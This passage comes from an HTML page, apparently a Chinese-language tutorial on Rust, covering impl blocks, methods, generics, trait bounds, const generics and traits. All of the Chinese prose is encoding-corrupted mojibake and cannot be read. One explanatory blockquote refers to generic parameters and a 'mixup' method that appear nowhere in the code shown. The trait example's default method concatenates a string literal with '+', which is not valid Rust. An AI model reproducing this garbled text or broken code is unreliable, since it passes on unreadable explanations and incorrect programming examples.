class="token constant">PI</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>radius <span class="token operator">*</span> <span class="token keyword">self</span><span class="token punctuation">.</span>radius<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·åšçš„å¥½å¤„åœ¨äºå¯ä»¥è®©æ–¹æ³•çš„å£°æ˜æ›´åŠ æ¸…æ™°ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸ºå®ŒæˆåŒä¸€ç§èŒèƒ½çš„æ–¹æ³•å£°æ˜åœ¨ä¸€ä¸ªimplå—ä¸­ï¼Œè¿™æ ·æ¯”èµ·å¡åœ¨ä¸€å—ä¼šæœ‰æ¡ç†å¾—å¤šã€‚</p><h3 id="å…³è”å‡½æ•°-amp-æ–¹æ³•"><a href="#å…³è”å‡½æ•°-amp-æ–¹æ³•" class="headerlink" title="å…³è”å‡½æ•°&amp;æ–¹æ³•"></a>å…³è”å‡½æ•°&amp;æ–¹æ³•</h3><p>çœ‹åˆ°<code>å‡½æ•°</code>å’Œ<code>æ–¹æ³•</code>äºŒå­—æˆ‘ä»¬ä¾¿å¯ä»¥çŸ¥æ™“ä»–ä»¬çš„ä¸åŒã€‚å‡½æ•°ä¸ä¼šç»‘å®šåœ¨ä¸€ä¸ªå¯¹è±¡ä¸Šï¼Œè€Œæ–¹æ³•ä¼šã€‚</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹å¦‚ä½•å£°æ˜å…³è”å‡½æ•°ä¸æ–¹æ³•</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Circle</span> <span class="token punctuation">{</span>    x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>    <span class="token comment">// newæ˜¯Circleçš„å…³è”å‡½æ•°ï¼Œå› ä¸ºå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸æ˜¯self</span>    <span class="token comment">// è¿™ç§æ–¹æ³•å¾€å¾€ç”¨äºåˆå§‹åŒ–å½“å‰ç»“æ„ä½“çš„å®ä¾‹</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>        <span class="token class-name">Circle</span> <span class="token punctuation">{</span>            x<span class="token punctuation">:</span> x<span class="token punctuation">,</span>            y<span class="token punctuation">:</span> y<span class="token punctuation">,</span>            radius<span class="token punctuation">:</span> radius<span class="token punctuation">,</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">// Circleçš„æ–¹æ³•ï¼Œ&amp;selfè¡¨ç¤ºå€Ÿç”¨å½“å‰çš„Circleç»“æ„ä½“</span>    <span class="token keyword">fn</span> <span class="token function-definition function">area</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">f64</span> <span class="token punctuation">{</span>        <span class="token namespace">std<span class="token punctuation">::</span></span><span class="token keyword">f64</span><span class="token punctuation">::</span><span class="token namespace">consts<span class="token punctuation">::</span></span><span class="token constant">PI</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>radius <span class="token operator">*</span> <span class="token keyword">self</span><span class="token punctuation">.</span>radius<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œæ‰€è°“çš„æ–¹æ³•ï¼Œå°±æ˜¯ä¼ å…¥äº†ä¸€ä¸ª<code>&amp;self</code>çš„å‡½æ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªè¯­æ³•ç³–ï¼Œå®é™…ä¸Šæ˜¯ <code>self: &amp;Self</code> çš„ç®€å†™ã€‚æ„æ€æ˜¯æˆ‘ä»¬ä¼ å…¥äº†ä¸€ä¸ªè¿™ä¸ªç±»å‹çš„å®ä¾‹çš„å¼•ç”¨ã€‚è¿™æ ·åœ¨è°ƒç”¨æ—¶ä¾¿å¯ä»¥ç›´æ¥<code>circle.area()</code>ã€‚</p><p>è€Œæ²¡æœ‰ä¼ å…¥è‡ªèº«å¼•ç”¨çš„å…³è”å‡½æ•°åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘åªè¯´å››ä¸ªå­—â€”â€”<strong>é™æ€æ–¹æ³•</strong>ã€‚</p><h3 id="ä¸ºæšä¸¾å®ç°æ–¹æ³•"><a href="#ä¸ºæšä¸¾å®ç°æ–¹æ³•" class="headerlink" title="ä¸ºæšä¸¾å®ç°æ–¹æ³•"></a>ä¸ºæšä¸¾å®ç°æ–¹æ³•</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#![allow(unused)]</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">enum</span> <span class="token type-definition class-name">Message</span> <span class="token punctuation">{</span>    <span class="token class-name">Quit</span><span class="token punctuation">,</span>    <span class="token class-name">Move</span> <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token keyword">i32</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token class-name">Write</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token class-name">ChangeColor</span><span class="token punctuation">(</span><span class="token keyword">i32</span><span class="token punctuation">,</span> <span class="token keyword">i32</span><span class="token punctuation">,</span> <span class="token keyword">i32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Message</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">call</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// åœ¨è¿™é‡Œå®šä¹‰æ–¹æ³•ä½“</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> m <span class="token operator">=</span> <span class="token class-name">Message</span><span class="token punctuation">::</span><span class="token class-name">Write</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ³›å‹-amp-ç‰¹å¾-trait"><a href="#æ³›å‹-amp-ç‰¹å¾-trait" class="headerlink" title="æ³›å‹&amp;ç‰¹å¾(trait)"></a>æ³›å‹&amp;ç‰¹å¾(trait)</h2><h3 id="å£°æ˜ä¸€ä¸ªåŸºç¡€çš„æ³›å‹"><a href="#å£°æ˜ä¸€ä¸ªåŸºç¡€çš„æ³›å‹" class="headerlink" title="å£°æ˜ä¸€ä¸ªåŸºç¡€çš„æ³›å‹"></a>å£°æ˜ä¸€ä¸ªåŸºç¡€çš„æ³›å‹</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">add</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span><span class="token class-name">T</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">T</span> <span class="token punctuation">{</span>    a <span class="token operator">+</span> b<span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"add i8: {}"</span><span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2i8</span><span class="token punctuation">,</span> <span class="token number">3i8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"add i32: {}"</span><span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"add f64: {}"</span><span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1.23</span><span class="token punctuation">,</span> <span class="token number">1.23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ç„¶å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸²ä»£ç æ˜¯è·‘ä¸äº†çš„ï¼Œä¸æ˜¯æ‰€æœ‰ç±»å‹éƒ½å…è®¸ç›¸åŠ çš„</p><h3 id="ä½¿ç”¨traitçº¦æŸæ³›å‹çš„ç±»å‹"><a href="#ä½¿ç”¨traitçº¦æŸæ³›å‹çš„ç±»å‹" class="headerlink" title="ä½¿ç”¨traitçº¦æŸæ³›å‹çš„ç±»å‹"></a>ä½¿ç”¨traitçº¦æŸæ³›å‹çš„ç±»å‹</h3><p>é‚£æˆ‘ä»¬å°±å°è¯•å¯¹ä»–çš„ç±»å‹è¿›è¡Œçº¦æŸ</p><p>è¿™é‡Œè¯­æ³•æ¯”è¾ƒç±»ä¼¼kotlin</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">add</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token namespace">std<span class="token punctuation">::</span>ops<span class="token punctuation">::</span></span><span class="token class-name">Add</span><span class="token operator">&lt;</span><span class="token class-name">Output</span> <span class="token operator">=</span> <span class="token class-name">T</span><span class="token operator">&gt;&gt;</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span><span class="token class-name">T</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">T</span> <span class="token punctuation">{</span>    a <span class="token operator">+</span> b<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œçš„<code>std::ops::Add&lt;Output = T&gt;</code>æ˜¯ä¸æ˜¯æ¯”è¾ƒç±»ä¼¼äºkotlinçš„æ¥å£ï¼Ÿåœ¨rustä¸­å®ƒå«åš<code>trait </code>,ç‰¹å¾ã€‚è€Œå®ç°äº†<code>std::ops::Add&lt;Output = T&gt;</code>,å°±æ”¯æŒäº†ç›¸åŠ ï¼Œæ³›å‹outputå°±æ˜¯ç›¸åŠ åç»“æœçš„ç±»å‹ã€‚</p><blockquote><p>è¿™äº›éƒ½è¯´æ˜ä¸€ä¸ªé“ç†ï¼Œç‰¹å¾å®šä¹‰äº†<strong>ä¸€ä¸ªå¯ä»¥è¢«å…±äº«çš„è¡Œä¸ºï¼Œåªè¦å®ç°äº†ç‰¹å¾ï¼Œä½ å°±èƒ½ä½¿ç”¨è¯¥è¡Œä¸º</strong>ã€‚</p></blockquote><h3 id="åœ¨æšä¸¾ä¸­ä½¿ç”¨æ³›å‹"><a href="#åœ¨æšä¸¾ä¸­ä½¿ç”¨æ³›å‹" class="headerlink" title="åœ¨æšä¸¾ä¸­ä½¿ç”¨æ³›å‹"></a>åœ¨æšä¸¾ä¸­ä½¿ç”¨æ³›å‹</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">enum</span> <span class="token type-definition class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token class-name">None</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">enum</span> <span class="token type-definition class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token class-name">E</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åœ¨æ–¹æ³•ä¸­ä½¿ç”¨æ³›å‹"><a href="#åœ¨æ–¹æ³•ä¸­ä½¿ç”¨æ³›å‹" class="headerlink" title="åœ¨æ–¹æ³•ä¸­ä½¿ç”¨æ³›å‹"></a>åœ¨æ–¹æ³•ä¸­ä½¿ç”¨æ³›å‹</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Point</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    x<span class="token punctuation">:</span> <span class="token class-name">T</span><span class="token punctuation">,</span>    y<span class="token punctuation">:</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">impl</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">&gt;</span> <span class="token class-name">Point</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">x</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token operator">&amp;</span><span class="token class-name">T</span> <span class="token punctuation">{</span>        <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>x    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token class-name">Point</span> <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token number">10</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"p.x = {}"</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>T,U</code> æ˜¯å®šä¹‰åœ¨ç»“æ„ä½“ <code>Point</code> ä¸Šçš„æ³›å‹å‚æ•°ï¼Œ<code>V,W</code> æ˜¯å•ç‹¬å®šä¹‰åœ¨æ–¹æ³• <code>mixup</code> ä¸Šçš„æ³›å‹å‚æ•°ï¼Œå®ƒä»¬å¹¶ä¸å†²çªï¼Œè¯´ç™½äº†ï¼Œä½ å¯ä»¥ç†è§£ä¸ºï¼Œä¸€ä¸ªæ˜¯ç»“æ„ä½“æ³›å‹ï¼Œä¸€ä¸ªæ˜¯å‡½æ•°æ³›å‹ã€‚</p></blockquote><h3 id="ä¸ºå…·ä½“çš„æ³›å‹ç±»å‹å®ç°æ–¹æ³•"><a href="#ä¸ºå…·ä½“çš„æ³›å‹ç±»å‹å®ç°æ–¹æ³•" class="headerlink" title="ä¸ºå…·ä½“çš„æ³›å‹ç±»å‹å®ç°æ–¹æ³•"></a>ä¸ºå…·ä½“çš„æ³›å‹ç±»å‹å®ç°æ–¹æ³•</h3><blockquote><p>å¯¹äº <code>Point&lt;T&gt;</code> ç±»å‹ï¼Œä½ ä¸ä»…èƒ½å®šä¹‰åŸºäº <code>T</code> çš„æ–¹æ³•ï¼Œè¿˜èƒ½é’ˆå¯¹ç‰¹å®šçš„å…·ä½“ç±»å‹ï¼Œè¿›è¡Œæ–¹æ³•å®šä¹‰ï¼š</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">impl</span> <span class="token class-name">Point</span><span class="token operator">&lt;</span><span class="token keyword">f32</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">distance_from_origin</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">f32</span> <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>x<span class="token punctuation">.</span><span class="token function">powi</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span>y<span class="token punctuation">.</span><span class="token function">powi</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ®µä»£ç æ„å‘³ç€ <code>Point&lt;f32&gt;</code> ç±»å‹ä¼šæœ‰ä¸€ä¸ªæ–¹æ³• <code>distance_from_origin</code>ï¼Œè€Œå…¶ä»– <code>T</code> ä¸æ˜¯ <code>f32</code> ç±»å‹çš„ <code>Point&lt;T&gt; </code>å®ä¾‹åˆ™æ²¡æœ‰å®šä¹‰æ­¤æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•è®¡ç®—ç‚¹å®ä¾‹ä¸åæ ‡<code>(0.0, 0.0)</code> ä¹‹é—´çš„è·ç¦»ï¼Œå¹¶ä½¿ç”¨äº†åªèƒ½ç”¨äºæµ®ç‚¹å‹çš„æ•°å­¦è¿ç®—ç¬¦ã€‚</p><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½é’ˆå¯¹ç‰¹å®šçš„æ³›å‹ç±»å‹å®ç°æŸä¸ªç‰¹å®šçš„æ–¹æ³•ï¼Œå¯¹äºå…¶å®ƒæ³›å‹ç±»å‹åˆ™æ²¡æœ‰å®šä¹‰è¯¥æ–¹æ³•ã€‚</p></blockquote><h3 id="const-æ³›å‹"><a href="#const-æ³›å‹" class="headerlink" title="const æ³›å‹"></a>const æ³›å‹</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">display_array</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token namespace">std<span class="token punctuation">::</span>fmt<span class="token punctuation">::</span></span><span class="token class-name">Debug</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>arr<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token class-name">T</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"{:?}"</span><span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> arr<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">i32</span><span class="token punctuation">;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">display_array</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> arr<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">i32</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">display_array</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆçœ‹çœ‹è¿™æ®µä»£ç ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çº¦æŸä¼ å…¥åˆ‡ç‰‡çš„å¤§å°è¯¥æ€ä¹ˆåšå‘¢</p><p>constæ³›å‹å…¶å®å°±æ˜¯é’ˆå¯¹å¸¸é‡å€¼çš„æ³›å‹</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">display_array</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token namespace">std<span class="token punctuation">::</span>fmt<span class="token punctuation">::</span></span><span class="token class-name">Debug</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token class-name">N</span><span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>arr<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token class-name">T</span><span class="token punctuation">;</span> <span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"{:?}"</span><span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> arr<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">i32</span><span class="token punctuation">;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">display_array</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> arr<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">i32</span><span class="token punctuation">;</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">display_array</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæˆ‘ä»¬å£°æ˜äº†ä¸€ä¸ªå¸¸é‡æ³›å‹usizeï¼Œè¿™ä¸ªusizeå¯ä»¥æ”¾åˆ°å…¥å‚å¤„åˆ‡ç‰‡çš„ç±»å‹ä¸­å»ï¼Œè¿™ä¾¿æ˜¯å¸¸é‡æ³›å‹çš„ç”¨æ³•ã€‚</p><h3 id="æ³›å‹çš„æ€§èƒ½"><a href="#æ³›å‹çš„æ€§èƒ½" class="headerlink" title="æ³›å‹çš„æ€§èƒ½"></a>æ³›å‹çš„æ€§èƒ½</h3><blockquote><p>åœ¨ Rust ä¸­æ³›å‹æ˜¯é›¶æˆæœ¬çš„æŠ½è±¡ï¼Œæ„å‘³ç€ä½ åœ¨ä½¿ç”¨æ³›å‹æ—¶ï¼Œå®Œå…¨ä¸ç”¨æ‹…å¿ƒæ€§èƒ½ä¸Šçš„é—®é¢˜ã€‚</p><p>ä½†æ˜¯ä»»ä½•é€‰æ‹©éƒ½æ˜¯æƒè¡¡å¾—å¤±çš„ï¼Œæ—¢ç„¶æˆ‘ä»¬è·å¾—äº†æ€§èƒ½ä¸Šçš„å·¨å¤§ä¼˜åŠ¿ï¼Œé‚£ä¹ˆåˆå¤±å»äº†ä»€ä¹ˆå‘¢ï¼ŸRust æ˜¯åœ¨ç¼–è¯‘æœŸä¸ºæ³›å‹å¯¹åº”çš„å¤šä¸ªç±»å‹ï¼Œç”Ÿæˆå„è‡ªçš„ä»£ç ï¼Œå› æ­¤æŸå¤±äº†ç¼–è¯‘é€Ÿåº¦å’Œå¢å¤§äº†æœ€ç»ˆç”Ÿæˆæ–‡ä»¶çš„å¤§å°ã€‚</p><p>å…·ä½“æ¥è¯´ï¼š</p><p>Rust é€šè¿‡åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ³›å‹ä»£ç çš„ <strong>å•æ€åŒ–</strong>(<em>monomorphization</em>)æ¥ä¿è¯æ•ˆç‡ã€‚å•æ€åŒ–æ˜¯ä¸€ä¸ªé€šè¿‡å¡«å……ç¼–è¯‘æ—¶ä½¿ç”¨çš„å…·ä½“ç±»å‹ï¼Œå°†é€šç”¨ä»£ç è½¬æ¢ä¸ºç‰¹å®šä»£ç çš„è¿‡ç¨‹ã€‚</p><p>ç¼–è¯‘å™¨æ‰€åšçš„å·¥ä½œæ­£å¥½ä¸æˆ‘ä»¬åˆ›å»ºæ³›å‹å‡½æ•°çš„æ­¥éª¤ç›¸åï¼Œç¼–è¯‘å™¨å¯»æ‰¾æ‰€æœ‰æ³›å‹ä»£ç è¢«è°ƒç”¨çš„ä½ç½®å¹¶é’ˆå¯¹å…·ä½“ç±»å‹ç”Ÿæˆä»£ç ã€‚</p></blockquote><h2 id="ç‰¹å¾-trait"><a href="#ç‰¹å¾-trait" class="headerlink" title="ç‰¹å¾(trait)"></a>ç‰¹å¾(trait)</h2><p>å…¶å®å¯¹åº”çš„å°±æ˜¯javaçš„interfaceï¼Œä¸è¿‡ä¼¼ä¹è®¾è®¡å¾—æ›´å¥½</p><h3 id="å®šä¹‰ç‰¹å¾"><a href="#å®šä¹‰ç‰¹å¾" class="headerlink" title="å®šä¹‰ç‰¹å¾"></a>å®šä¹‰ç‰¹å¾</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">trait</span> <span class="token class-name">Summary</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">summarize</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span><span class="token punctuation">;</span>        <span class="token comment">// å…è®¸æœ‰é»˜è®¤å®ç°</span>    <span class="token comment">// é»˜è®¤å®ç°ä¸­å…è®¸è°ƒç”¨å…¶ä»–æ–¹æ³•</span>    <span class="token keyword">fn</span> <span class="token function-definition function">summarize1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span> <span class="token punctuation">{</span>        <span class="token string">"å·´æ‹‰å·´æ‹‰"</span> <span class="token operator">+</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">summarize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 